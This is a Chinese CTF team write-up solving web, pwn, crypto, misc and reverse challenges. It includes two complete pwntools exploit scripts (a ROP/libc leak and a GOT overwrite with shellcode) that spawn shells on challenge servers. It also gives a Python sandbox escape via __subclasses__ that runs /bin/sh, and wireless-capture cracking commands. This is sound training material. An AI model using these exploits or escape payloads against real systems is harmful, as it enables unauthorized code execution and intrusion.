# CNSS_Junior_wp
## Web
### easyweb
非预期，admin空密码getflag,注意js限制了空密码，burp改包即可

## pwn
### supermarket
- 第一个点是add a commodity函数中当price为0的时候，原有price不会被清空，利用这一点可以先申请一个很大的description空间，然后便可以控制接下来申请的内存中的price的内容。
- 第二个点是show list函数中的s[768]数组作为输出缓冲区存在溢出（因为第一点中的price可以任意控制），便可以覆盖返回地址，适当控制长度便可以覆盖返回地址，因为首先会覆盖输出商品循环的i，所以在覆盖返回地址的前一刻把i覆盖成-1，便可以写入存在第一个商品信息中的rop，getshell
- exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
ip = '117.78.40.45'
port = 32755
MODE = 1
VERBOSE = 1
printf_offset = 0x00049020
system_offset = 0x0003A940
binsh_offset = 0x0015902B

def add_function(p, name, price, descrip_size, descrip):
    p.recvuntil('your choice>> ')
    p.sendline('1')
    p.recvuntil('name:')
    p.send(name)
    p.recvuntil('price:')
    p.sendline(str(price))
    p.recvuntil('descrip_size:')
    p.sendline(str(descrip_size))
    p.recvuntil('description:')
    p.send(descrip)

def delete_function(p, name):
    p.recvuntil('your choice>> ')
    p.sendline('2')
    p.recvuntil('name:')
    p.send(name)

def show_list(p):
    p.recvuntil('your choice>> ')
    p.sendline('3')

def crack(ip='', port=0):
    if VERBOSE:
        context.log_level = 'debug'

    if MODE == 0:
        if DEBUG:
            p = gdb.debug((p_NAME, ), gdbscript=gdbscript, env=env)
            raw_input('')
        else:
            p = process((p_NAME, ), env=env)
            sol = ''
    else:
        p = remote(ip, port)

    add_function(p, 's'*15, 999, 0x100, 'b'*0xff)
    delete_function(p, 's'*15 + '\n')
	
    payload = 'ab' + p32(0x8048812) + p32(0x08048602) + p32(0x804b504+1) + 'cd'
    add_function(p, 's'*15 , 0, 0x11, payload)
    add_function(p, 'b'*15, 0, 0x11, 'b'*16)
    add_function(p, 'c'*15, 0, 0x11, 'c'*16)

    for i in range(3, 15):
        add_function(p, chr(ord('a')+i)*15, 999, 0x11, chr(ord('a')+i+1)*16)
    add_function(p, 'r'*15, 999, 0x11, '\xff'*16)
    show_list(p)

    payload = 'a'*12
    payload += p32(0x08048570) + p32(0x080484d9) + p32(0x0804B014)
    payload += p32(0x8048812) + p32(0x08048cdd) + p32(0x804b504+1+12 + 4*3 + 4*3 + 4) + p32(100)
    p.sendline(payload)

    add_function(p, 'a'*15, 999, 0x100, 'b'*0xff)
    delete_function(p, 'a'*15 + '\n')
    payload = 'abcdefg'.ljust(16, 'a')
    payload = p32(0x804b504+1 + 12 - 4) + p32(0x08048668) + 'a'*8
    add_function(p, 'a'*13 + '\n', 0, 0x11, payload)
    add_function(p, 'c'*15, 0, 0x11, 'd'*16)
    add_function(p, 'd'*15, 0, 0x11, 'e'*16)

    for i in range(3, 15):
        add_function(p, chr(ord('b')+i)*15, 999, 0x11, chr(ord('b')+i)*16)
    add_function(p, 'w'*15, 999, 0x11, '\xff'*16)
    show_list(p)

    p.recvuntil('\n\n')
    printf_addr = u32(p.recv(4))
    free_addr = u32(p.recv(4))
    log.info('printf_addr=0x%x' % printf_addr)
    log.info('free_addr=0x%x' % free_addr)

    libc_base = printf_addr - printf_offset
    payload = p32(system_offset + libc_base) + p32(0) + p32(binsh_offset + libc_base)
    p.sendline(payload)

    return p

def main():
    p = crack(ip,port)
    p.interactive()

if __name__ == '__main__':
    main()

```
### note_service2
在add 函数里面,index是用户自己输入的，index和context内容并且没有做检测，index可以输入负数，而且是在bss段的，观察发现del函数有free，而bss段上面就是.got.plt段,就可以考虑覆盖做rop，一次写入8字节，构造ROPchain,getshell!

```python
from pwn import *
context.arch = 'amd64'

def z(a=''):
	gdb.attach(p,a)
	if a=='':
		raw_input()

p = remote('117.78.43.222',31311)


def addnote(index,size,context):
    p.sendline('1')
    p.sendline(str(index))
    p.sendline(str(size))
    p.sendline(context)

ROPJMP = '\xeb\x19'
shellcodeP1 = '''
push 0x3b
'''
shellcodeP2='''
pop rax
'''
shellcodeP3 = '''
xor rsi,rsi
nop
nop
'''
shellcodeP4 = '''
xor rdx,rdx
nop
nop
'''
shellcodeP5 = '''
syscall 
nop
nop
'''

def getshell():
    payload1 = asm(shellcodeP1).ljust(5,'\x90')
    payload2 = asm(shellcodeP2).ljust(5,'\x90')
    payload3=asm(shellcodeP3)
    payload4=asm(shellcodeP4)
    payload5=asm(shellcodeP5)

    addnote(-17,8,payload1+ROPJMP) #over free got 
    addnote(0,8,payload2+ROPJMP) 
    addnote(1,8,payload3+ROPJMP)
    addnote(2,8,payload4+ROPJMP)
    addnote(3,8,payload5)
    addnote(4,8,'/bin/sh\x00') # execve("/bin/sh")

    p.sendline('4')
    p.recvuntil('index:')
    p.sendline('4')
    p.interactive()

if __name__=="__main__":
    getshell()
```

## Crypto
### flag_in_your_hand

flag真的就在手里，一个移位数组，移完就是flag。
###  sm
```python
import base64
import hashlib
import binascii

ef = b"5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78="
r=6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658

def num_to_string(x):
    hex_x = hex(x)[2:]
    if len(hex_x) % 2 == 1:
        hex_x = '0' + hex_x
    res = bytearray()
    for i in range(len(hex_x) >> 1):
        res.append(int(hex_x[i * 2: i * 2 + 2], 16))
    return bytes(res)

ps = []
f = open("ps", "r")
while True:
    line = f.readline()
    if not line:
        break
    ps.append(int(line))

mat = []
b = [0] * 512
for i in range(512):
    mat.append([0] * 512)

for i in range(512):
    for j in range(512):
        mat[i][j] = (ps[j] >> (511 - i)) & 1
    b[i] = (r >> (511 - i)) & 1

for i in range(512):
    for j in range(i, 512):
        if mat[j][i] == 1:
            mat[i], mat[j] = mat[j], mat[i]
            b[i], b[j] = b[j], b[i]
            break
    for j in range(512):
        if j != i and mat[j][i] == 1:
            for k in range(i, 512):
                mat[j][k] ^= mat[i][k]
            b[j] ^= b[i]

ch = 0
for i in range(512):
    tmp = 0
    for j in range(512):
        tmp = (tmp << 1) | mat[i][j]
    if tmp != (1 << (511 - i)):
        print("Wrong at", i)
        exit(0)
    ch = (ch << 1) | b[i]

bch = bin(ch)[2:]
bch = "0" * (512 - len(bch)) + bch
rr = 0
for i in range(512):
    if bch[i] == '1':
        rr = rr ^ ps[i]
def num_to_string(x):
    hex_x = hex(x)[2:]
    if len(hex_x) % 2 == 1:
        hex_x = '0' + hex_x
    res = bytearray()
    for i in range(len(hex_x) >> 1):
        res.append(int(hex_x[i * 2: i * 2 + 2], 16))
    return bytes(res)
key = hashlib.md5(num_to_string(ch)).hexdigest()
cipher = binascii.b2a_hex(base64.b64decode(ef))

print(key)
print()
print(cipher)
```
将此异或方程组，直接化成 512 * 512 的矩阵，然后高斯消元。

将得到的key和密文使用在线网站解密。

## Misc

### PICTURE
* binwalk跑图片可以看到是一个jpg，而不是文件名标注的png，而且可以看到有一个zlib的包，binwalk -e 可以解压出来，
* 看到一段base64文本，解码之后是一个二进制文件，打开文件看到文件头KP，猜测是zip，修改为PK后可以打开为zip，
* 根据注释里的提示，用python2.7进行除零操作，得到密码integer division or modulo by zero，解压之后，根据begin end判断是一个uuencode文件，decode即可得到flag
### 寻找入侵者

直接把所有地址拖出来做成一个字典跑一下  
aircrack-ng hanshake.cap看一下SSID  
密码和SSID都有了可以解密一下数据包  
airdecap-ng hanshake.cap -p 88:25:93:c1:c8:eb -e Honey  
分析解密后的数据包可以找到一个key.rar  
打开又是一个数据包，flag应该在里面了  
string一下  
看了下strings出来的数据，最后一行明显flag格式，去掉！试一下  
成功getflag

### Run
经过尝试，过滤了很多东西，但是可以通过继承它的基类再获取所有子类能够得到一些有趣的东西
```
print ().__class__.__bases__[0].__subclasses__()
```
根据打印出来的列表，可以发现其中有file
所以可以通过
```
print ().__class__.__bases__[0].__subclasses__()[-47]("/foo/bar").read()
```
来达到任意文件读
然后读/proc/self/cmdline可以拿到用户路径和文件名
```
python -u /home/ctf/sandbox.py
```
然后再读取源文件发现过滤了很多。。而且似乎没什么利用
回到读取的类表，发现其中有ctypes,这个类里面有import os 的操作，可以利用
先打印出ctypes的func_globals，由于屏蔽了'ls'，这里我们采用getattribute的方式绕过
```
print ().__class__.__base__.__subclasses__()[-2].__init__.__getattribute__('func_global' + 's')
```
果然环境没有修改，里面有_os
剩下的内容就很简单了
直接执行
```
().__class__.__base__.__subclasses__()[-2].__init__.__getattribute__('func_global' + 's')['_o'+'s'].__getattribute__('s' + 'ystem')('/bin/sh')
```
即可getshell

## Reverse
### 2ex

mips的题，base64变表，修改了补位符为`@` ，表直接从程序文件里抄出来，将out内容解密回去就行了。

### RE

这题很容易，输入值以_分成三部分，前两个部分的md5值已知（第二部分的需要异或一下），可以直接网上找到原文，最后一个部分显然不可能爆破，发现解密出来的文件仅仅用到了前两部分，那么直接强制让他解密出来，猜测是张图片，经过多次测试发现应该是一张jpg文件，分奇偶异或的值直接可以拿到（从JFIF处就可以拿到了），解密图片后得到第三段flag。

### Tryme
win64下的CrackMe，拿到之后调试器载入，直接挂掉了，猜测有反调试，于是从头开始一步步调试，发现程序动态解密了一大段内存，然后直接跳转到了这一段内存中执行，通过动态跟踪这段内存，发现它写出来了一个dll文件，而且还把它给加载了，于是在调试过程中把dll文件提取出来，IDA载入分析。

dll放入ida中分析验证函数，直接F5看伪代码，这个地方卡了好久，一直没有发现是怎么回事：

```cpp
      scanf_s("%s", &v68, 1024i64);
      JUMPOUT(v1, (char *)&loc_18000162A + 2);
      JUMPOUT(!v1, (char *)&loc_18000162A + 2);
      JUMPOUT(!((unsigned __int8)(v20 ^ v2) | v1), (char *)&loc_18000166F + 3);
      JUMPOUT(*(_QWORD *)&word_180001626);
    }
    v30 = v15 == 0;
    if ( v15 )
    {
      v30 = v14 == 0i64;
      if ( v14 )
      {
        if ( v14 && !v14 )
        {
          JUMPOUT(0, (char *)&loc_18000156E + 6);
          JUMPOUT(*(_QWORD *)byte_180001528);
        }
        JUMPOUT(v14 == 0i64, (char *)&loc_180001542 + 1);
        JUMPOUT(v14 != 0i64, (char *)&loc_180001542 + 1);
        JUMPOUT((signed __int64)v14 > 0, byte_180001589);
        JUMPOUT(*(_QWORD *)byte_18000153D);
      }
    }
    if ( !v30 && v30 )
    {
      JUMPOUT(v30, (char *)&loc_180001A67 + 6);
      *v17 += (_DWORD)v16;
      JUMPOUT(*(_QWORD *)&dword_180001A2C);
    }
    result = puts(&Str);
```

程序获取中有一个临时变量Str在没有任何初始化的时候就直接被引用了，最后才发现原来是汇编代码有奇怪的混淆指令，这个混淆指令很烦，不知道怎么去除，于是就在ida的汇编模式下一个个汇编的看，看到三个连续的汇编跳转，前两个跳转跳转到同一个地方，一个成功跳转另一个不成功跳转，那么遇到这种指令就直接看跳转过去的地方就好了，跟踪了很久最后终于发现了一条指令：

```
	r	sub_180001050+81A	mov     r8, rva qword_1800218D0[r14+r11]
```

这个qword的东西很可疑，于是过去看了一下，把数据拿了出来，数据的长度是0x40，后来就没管了，还有一些OpenServiceA之类的不太清楚的函数调用，觉得可能是加载了一个驱动文件，回到x64dbg里面继续调试，在WriteFile地方下断点，结果真的截取到了一个驱动文件！写在了appdata/roaming目录下，而且还是随机的名称，并且还存在很多个这样的文件！应该是没有删除之前创建出来的文件吧。。。

ida分析这个驱动文件，看到很多DebugPort字样，Debug是调试的意思，那这个函数肯定就是用来检测程序是否在被调试了

```
DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_1400014A0;
  RtlInitUnicodeString(&DestinationString, L"\\Device\\CyberPeaceA");
  result = IoCreateDevice(v1, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
  if ( result >= 0 )
  {
    DeviceObject->Flags |= 0x10u;
    DeviceObject->Flags &= 0xFFFFFF7F;
    RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\CyberPeaceA");
    v6 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
    if ( v6 >= 0 )
    {
      LOBYTE(v5) = 1;
      *((_DWORD *)v1->DriverSection + 26) |= 0x20u;
      sub_140001320(v5);
      sub_140006160(v1->DriverSection);
      result = 0;
    }
    else
    {
      IoDeleteDevice(DeviceObject);
      result = v6;
    }
  }
  return result;
}
```

上面的部分应该就是为这个驱动本身做一些初始化的工作，方便和主程序进行信息交流。

在`sub_1400017C0`中看到了另一个奇怪的代码：

```
   else if ( (_DWORD)v6 == 1 )
    {
      RtlInitUnicodeString(&DestinationString, L"\\??\\C:\\1.sys");
      sub_1400069B0(&DestinationString);
    }
```

难道又有一个驱动吗，于是回到调试器中，保持WriteFile的断点，然后输入flag，果真截取到了一个文件，但是这个文件很奇怪，长度为1E00，可以发现很长，但是却是乱码，看了一下也不像是windows的配置文件啥的，又卡住了，回去第一个驱动文件中看了一下代码，在`sub_140001500`中发现了一段很长的解密代码，但是看到最后实际上是对目标做了一个异或运算，就直接返回了，很长的解密部分只是生成了用来异或的表，最重要的是，这个表是50字节的，异或是轮换着和它异或。

联想到之前做过的一道misc题，0与任何数异或，结果一定就是那个数，那么如果这个文件真的就是一个sys文件，文件内部肯定有很多0（比方说PE文件头的尾部就有很多0，如果区段不多的话），于是将文件0x320(0x320 % 50 == 0，并且第一个驱动0x320处全是零)开始50个字节的内容取出来，用他们来轮流异或整个文件，再写回去，发现真的成功解密出了一个sys文件！

这个sys文件里面有重大信息:

```
 ExFreePoolWithTag(Str, 0x53797330u);
    v15 = "7Evj5rGTJKFhyHyT6EMLJE2NJfqS6EJf6KFg7ERY5Ns=";
    v3 = strlen("7Evj5rGTJKFhyHyT6EMLJE2NJfqS6EJf6KFg7ERY5Ns=");
    if ( !memcmp("7Evj5rGTJKFhyHyT6EMLJE2NJfqS6EJf6KFg7ERY5Ns=", Buf2, v3) )
    {
```

看到=符号，猜想他是一个base64密文，于是直接用b64解密发现是乱码，那有可能是自己改过的一个base64，在上面的函数里看到：

```
Buf2[4 * i] = b64_tbl[(signed int)v3 >> 2];
    Buf2[4 * i + 1] = b64_tbl[((unsigned __int8)((signed int)v4 >> 4) | (unsigned __int8)(16 * v3)) & 0x3F];
    Buf2[4 * i + 2] = b64_tbl[((unsigned __int8)((signed int)v5 >> 6) | (unsigned __int8)(4 * v4)) & 0x3F];
    Buf2[4 * i + 3] = b64_tbl[v5 & 0x3F];
```

b64_tbl是由参数传递进来的一个数据，查看他的xref可以发现

```cpp
b64_tbl = Str + 35;

sub_140001554(77, Str + 35, 64u);

__int64 __fastcall sub_140001554(int a1, char *mem, unsigned int a3)
{
  __int64 v3;
  __int64 result;
  signed int i;
  signed int j;
  int v7;
  int *v8;
  int v9;

  v9 = 2 * a1 + 10;
  LODWORD(v8) = 0;
  memset((char *)&v8 + 4, 0, 196ui64);
  for ( i = 0; i < 50; ++i )
  {
    v3 = (i + 10) * v9 - 9;
    *((_DWORD *)&v8 + i) = (unsigned __int8)(BYTE4(v3) + (i + 10) * v9 - 9) - BYTE4(v3);
  }
  v7 = 0;
  for ( j = 0; ; ++j )
  {
    result = a3;
    if ( j >= (signed int)a3 )
      break;
    if ( v7 == 50 )
      v7 = 0;
    mem[j] ^= *((_BYTE *)&v8 + 4 * v7++);
  }
  return result;
}
```

这个函数对传递进来的数据做了一次变换，最终用变换过后的mem来做base64的表，于是根据这个函数，联想到之前拿到的一串奇怪的数据，把那串数据送给这个函数一试，真的就解密成了一个表！表长下面这个样子：

`vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/`

然后字节写一个base64解密，把表替换掉，解密sys2中出现的字符串就可以得到flag了：

`90705bb55efb59da7fc2a5636549812a`

下来之后一定要好好分析这道题的反调试，看到了一些奇怪的技巧，尤其是指令混淆那个地方感觉很厉害，感觉还有好多东西没有分析出来就误打误撞撞出了flag，感谢出题人，学习了很多姿势。